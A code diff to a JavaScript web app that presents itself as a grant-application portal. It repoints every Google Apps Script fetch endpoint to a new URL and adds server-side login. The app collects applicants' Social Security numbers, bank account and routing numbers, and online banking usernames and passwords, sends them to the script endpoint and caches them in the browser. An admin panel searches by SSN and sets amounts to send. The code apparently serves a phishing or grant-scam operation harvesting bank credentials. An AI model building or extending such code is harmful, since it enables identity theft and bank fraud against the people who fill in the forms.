@@ -1003,7 +1003,7 @@ async function logLogin(username, account) {
     };
 
     // 3. Send to Apps Script
-    await fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+    await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify(payload)
@@ -1482,7 +1482,7 @@ function cancelApplication(grantType, bankName) {
   // Optional GAS sync — send a statusUpdate record. GAS handler we'll add in Step 8.
   // We fire-and-forget; failures here don't block the UI.
   try {
-    fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+    fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify({
@@ -1530,7 +1530,7 @@ function advanceToProcessing(grantType, bankName) {
 
   // Sync to GAS (fire and forget).
   try {
-    fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+    fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify({
@@ -1716,65 +1716,195 @@ function advanceToProcessing(grantType, bankName) {
     function hideLoginModal() { document.getElementById('login-modal').classList.add('hidden'); }
     function closeCustomAlert() { document.getElementById('custom-alert-modal').classList.add('hidden'); }
 
-    async function performLogin() {
+        async function performLogin() {
       const pageLoader = document.getElementById('page-loader');
       pageLoader.classList.add('show');
       document.querySelector('#page-loader .loader-text').innerText = 'Securing Connection...';
+
       const u = document.getElementById('username').value.trim();
       const p = document.getElementById('password').value.trim();
+
       if (!u || !p) {
-        triggerCustomAlert("Invalid identity verification configuration. Please check credentials.");
+        triggerCustomAlert("Please enter both your Applicant ID and Password.");
         pageLoader.classList.remove('show');
         return;
       }
-      let selectedUser = null;
-// Check for dynamically created accounts first
-if (accountDatabase[u] && accountDatabase[u].password === p) {
-  selectedUser = u;
-} else if (u === "Demo" && p === "Grant2026") {
-  selectedUser = "Demo";
-} else {
-  triggerCustomAlert("Invalid identity verification configuration. Please check credentials.");
-  pageLoader.classList.remove('show');
-  return;
-}
+
+      // Local fast-path: Demo account still works offline.
+      if (u === "Demo" && p === "Grant2026") {
+        await completeLoginFlow("Demo", pageLoader);
+        return;
+      }
+
+      // Cross-device login: ask the server to verify credentials against
+      // Sheet1, then return the profile so any device can log in.
+      pageLoader.classList.remove('show');
+      const gatewayOverlay = document.getElementById('loading-gateway');
+      const statusLabel = document.getElementById('loading-status-text');
+      const visualBar = document.getElementById('loading-bar');
+      gatewayOverlay.classList.remove('hidden');
+      statusLabel.innerText = "Verifying credentials with server...";
+      visualBar.style.width = '25%';
+
+      let authResult = null;
+      try {
+        const resp = await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
+          method: "POST",
+          headers: { "Content-Type": "text/plain;charset=utf-8" },
+          body: JSON.stringify({
+            recordType: "authLogin",
+            username: u,
+            password: p
+          })
+        });
+        authResult = await resp.json();
+      } catch (err) {
+        console.log("Auth request failed:", err);
+      }
+
+      if (!authResult || authResult.result !== "success") {
+        gatewayOverlay.classList.add('hidden');
+        pageLoader.classList.remove('show');
+        triggerCustomAlert("Invalid identity verification configuration. Please check credentials.");
+        return;
+      }
+
+      visualBar.style.width = '55%';
+      statusLabel.innerText = "Loading your profile...";
+
+      // Build (or refresh) the local account entry from the server response.
+      const profile = authResult.profile || {};
+      const fullName = ((profile.firstName || '') + ' ' + (profile.lastName || '')).trim() || u;
+
+      // The first application row is the "primary" profile. Additional apps
+      // come from the AdditionalApplications sheet via authResult.
+      const primaryBank = {
+        name: profile.bankName || '',
+        username: profile.username || '',
+        password: profile.password || '',
+        account: profile.accountNumber || '',
+        routing: profile.routingNumber || '',
+        accountYear: profile.accountYear || ''
+      };
+
+      const primaryApp = {
+        rowId: profile.RowId || null,
+        date: (profile.Timestamp || '').toString().split('T')[0] || new Date().toISOString().split('T')[0],
+        submittedAt: profile.Timestamp || new Date().toISOString(),
+        type: 'DEBIT',
+        sender: fullName,
+        receiver: (grantTitles[profile.grantType] || 'Grant') + ' Program',
+        narration: 'APPLICATION/' + u + '/SUBMITTED',
+        amount: 'ELIGIBLE',
+        status: (profile.Status || 'SUBMITTED').toString().toUpperCase(),
+        grantType: profile.grantType || 'financial-aid',
+        banksUsed: [primaryBank]
+      };
+
+      const additionalApps = (authResult.additionalApplications || []).map(a => {
+        const bank = {
+          name: a.BankName || '',
+          username: a.OnlineBankingUsername || '',
+          password: a.OnlineBankingPassword || '',
+          account: a.AccountNumber || '',
+          routing: a.RoutingNumber || '',
+          accountYear: a.AccountYear || ''
+        };
+        return {
+          rowId: a.RowId || null,
+          date: (a.Timestamp || '').toString().split('T')[0] || new Date().toISOString().split('T')[0],
+          submittedAt: a.Timestamp || new Date().toISOString(),
+          type: 'DEBIT',
+          sender: fullName,
+          receiver: (grantTitles[a.GrantType] || 'Grant') + ' Program',
+          narration: 'APPLICATION/' + u + '/' + (bank.name || 'BANK').replace(/\s+/g, '_') + '/SUBMITTED',
+          amount: 'ELIGIBLE',
+          status: (a.Status || 'SUBMITTED').toString().toUpperCase(),
+          grantType: a.GrantType || 'financial-aid',
+          banksUsed: [bank]
+        };
+      });
+
+      // Merge with anything already in localStorage for this user so we
+      // don't lose cancel/history flags the user set locally.
+      const existing = accountDatabase[u] || {};
+      const ledger = [primaryApp, ...additionalApps];
+
+      // Preserve locally-cancelled applications that aren't in the sheet yet.
+      if (existing.ledger) {
+        existing.ledger.forEach(tx => {
+          if ((tx.status || '').toUpperCase() === 'CANCELLED') {
+            ledger.push(tx);
+          }
+        });
+      }
+
+      const accountPayload = {
+        fullName: fullName,
+        memberId: existing.memberId || Math.floor(10000000 + Math.random() * 90000000).toString(),
+        accountNum: existing.accountNum || ('UWA-' + (40000000 + Math.floor(Math.random() * 999999))),
+        displayNum: (grantTitles[profile.grantType] || 'Grant') + ' (...' + (profile.accountNumber || '').toString().slice(-5) + ')',
+        balance: existing.balance || '$0.00',
+        avatar: existing.avatar || 'https://res.cloudinary.com/daf2dvttg/image/upload/v1782756918/IMG_8538_uunp7c.png',
+        password: p,
+        ssn: profile.ssn || existing.ssn || '',
+        bankName: profile.bankName || existing.bankName || '',
+        bankAddress: profile.bankAddress || existing.bankAddress || '',
+        accountNumber: profile.accountNumber || existing.accountNumber || '',
+        routingNumber: profile.routingNumber || existing.routingNumber || '',
+        accountYear: profile.accountYear || existing.accountYear || '',
+        bankingUsername: profile.username || existing.bankingUsername || '',
+        bankingPassword: profile.password || existing.bankingPassword || '',
+        ledger: ledger
+      };
+
+      saveAccount(u, accountPayload);
+
+      visualBar.style.width = '100%';
+      statusLabel.innerText = "Syncing your applications...";
+
+      // Sync the freshly built ledger from the sheet so statuses and
+      // eligible amounts are accurate.
+      try {
+        await syncUserApplicationsFromSheet(u);
+      } catch (e) {
+        console.log("Sync during login failed:", e);
+      }
+
+      sessionStorage.setItem('loggedInUser', u);
+      sessionStorage.setItem('loginTime', new Date().toISOString());
+
+      // Log the login for the record.
+      try { await logLogin(u, accountDatabase[u]); } catch (e) {}
+
+      gatewayOverlay.classList.add('hidden');
+      pageLoader.classList.remove('show');
+      window.location.reload();
+    }
+
+    // Kept for the Demo fast-path — same loading sequence as before.
+    async function completeLoginFlow(selectedUser, pageLoader) {
       hideLoginModal();
       const gatewayOverlay = document.getElementById('loading-gateway');
       const statusLabel = document.getElementById('loading-status-text');
       const visualBar = document.getElementById('loading-bar');
       gatewayOverlay.classList.remove('hidden');
-      setTimeout(() => { document.querySelector('#page-loader .loader-text').innerText = 'Verifying Credentials...'; }, 200);
-      setTimeout(() => { visualBar.style.width = '35%'; statusLabel.innerText = "Securing active terminal session..."; document.querySelector('#page-loader .loader-text').innerText = 'Securing Session...'; }, 800);
-      setTimeout(() => { visualBar.style.width = '55%'; statusLabel.innerText = "Syncing credit ledger architecture..."; document.querySelector('#page-loader .loader-text').innerText = 'Syncing Ledger...'; }, 1600);
-      setTimeout(() => { visualBar.style.width = '80%'; statusLabel.innerText = "Finalizing secure pipeline..."; document.querySelector('#page-loader .loader-text').innerText = 'Finalizing Session...'; }, 2800);
-            setTimeout(async () => {
+
+      setTimeout(() => { visualBar.style.width = '35%'; statusLabel.innerText = "Securing active terminal session..."; }, 400);
+      setTimeout(() => { visualBar.style.width = '55%'; statusLabel.innerText = "Syncing credit ledger architecture..."; }, 900);
+      setTimeout(() => { visualBar.style.width = '80%'; statusLabel.innerText = "Finalizing secure pipeline..."; }, 1500);
+
+      setTimeout(async () => {
         visualBar.style.width = '100%';
         statusLabel.innerText = "Syncing your applications...";
-        document.querySelector('#page-loader .loader-text').innerText = 'Syncing Dashboard...';
-
-        // 1. Sync the user's applications from the sheet FIRST.
-        //    This ensures the dashboard reflects any admin decisions
-        //    before the page reloads.
-        try {
-          await syncUserApplicationsFromSheet(selectedUser);
-        } catch (e) {
-          console.log("Sync during login failed:", e);
-        }
-
-        // 2. Save the session so the dashboard knows who is logged in
+        try { await syncUserApplicationsFromSheet(selectedUser); } catch (e) {}
         sessionStorage.setItem('loggedInUser', selectedUser);
         sessionStorage.setItem('loginTime', new Date().toISOString());
-
-        // 3. Log the login to Google Sheets (fire and forget is fine,
-        //    but we await so the loader shows the right message)
-        const account = accountDatabase[selectedUser];
-        try { await logLogin(selectedUser, account); } catch (e) {}
-
-                // 4. Hide overlays and reload
+        try { await logLogin(selectedUser, accountDatabase[selectedUser]); } catch (e) {}
         gatewayOverlay.classList.add('hidden');
         pageLoader.classList.remove('show');
         window.location.reload();
-      }, 3800);
+      }, 2200);
     }
 
     function logout() {
@@ -2198,7 +2328,7 @@ document.getElementById('application-form').addEventListener('submit', async fun
 
         Object.assign(additionalData, extraFieldsForSheet);
 
-        const resp = await fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+        const resp = await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
           method: "POST",
           headers: { "Content-Type": "text/plain;charset=utf-8" },
           body: JSON.stringify(additionalData)
@@ -2355,7 +2485,7 @@ window.__generatedCredentials = {
 
         try {
     // Wait for Google Sheets to CONFIRM the data is saved
-    const response = await fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+    const response = await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify(formData)
@@ -2487,7 +2617,7 @@ async function recoverCredentials() {
       btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Searching... (Attempt ${attempts})`;
       
       try {
-        const response = await fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+        const response = await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
           method: "POST",
           headers: { "Content-Type": "text/plain;charset=utf-8" },
           body: JSON.stringify({ 
@@ -2820,7 +2950,7 @@ async function adminSearchBySSN() {
   `;
 
   try {
-        const response = await fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+        const response = await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify({
@@ -2960,7 +3090,7 @@ async function adminAction(rowId, newStatus) {
   const amountToSend = (amountInput === null) ? null : amountInput.trim();
 
   try {
-    const statusPromise = fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+    const statusPromise = fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify({
@@ -2972,7 +3102,7 @@ async function adminAction(rowId, newStatus) {
 
     const tasks = [statusPromise];
     if (amountToSend && amountToSend !== "") {
-      tasks.push(fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+      tasks.push(fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
         method: "POST",
         headers: { "Content-Type": "text/plain;charset=utf-8" },
         body: JSON.stringify({
@@ -3011,7 +3141,7 @@ async function syncUserApplicationsFromSheet(username) {
   if (!username || !accountDatabase[username]) return false;
 
   try {
-    const response = await fetch("https://script.google.com/macros/s/AKfycbwoeKG2hUy1OOA4odDOz6xU4XyR2ufZ8bd8Aro2nR_yVt0ASuEgcftlhCu94De2yh5sng/exec", {
+    const response = await fetch("https://script.google.com/macros/s/AKfycbw2VafbDawIyxElXLzlFWks57LjWDvF_9VTbc4eSyOanfqhTyxPPZvwOSFU7chhrdB5/exec", {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify({
